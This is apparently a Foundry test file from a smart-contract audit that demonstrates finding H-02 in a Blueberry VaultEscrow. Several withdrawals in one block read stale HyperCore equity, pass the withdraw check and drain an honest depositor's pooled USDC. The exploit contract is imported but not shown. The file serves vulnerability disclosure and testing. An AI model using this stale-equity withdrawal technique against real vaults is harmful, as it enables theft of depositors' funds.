// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, VaultEscrow, VaultEquityPrecompile, L1Write, MockUSDC} from
    "./61455-h-02-withdraw-check-can-be-bypassed-pashov-audit-group-none.sol";

// Blueberry H-02 (finding 61455): VaultEscrow.withdraw() gates the amount with
// `require(assets_ <= _vaultEquity())`, and _vaultEquity() reads the vault equity
// from the HyperCore precompile (0x…0802) which only syncs once per EVM block.
// Same-block withdrawals all read the same STALE equity and each passes the
// check, so the attacker withdraws 2x their real equity — draining an honest
// depositor's pooled funds and freezing that depositor's withdrawal.
contract Finding61455Test is Test {
    function test_exploit_staleEquity_bypassesWithdrawCheck() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("received (2x equity)", e.received());
        emit log_named_uint("stolen (honest depositor)", e.stolen());
        emit log_named_uint("reserve after", e.reserveAfter());

        // attacker walked away with 2000 USDC on a real equity of only 1000 USDC
        assertEq(e.received(), 2 * 1_000e6, "attacker withdrew 2x equity");
        assertEq(e.stolen(), 1_000e6, "1000 USDC stolen from honest depositor");
        assertEq(e.reserveAfter(), 0, "pooled reserve fully drained");
        assertTrue(e.honestWithdrawReverted(), "honest depositor can no longer withdraw");
    }
}
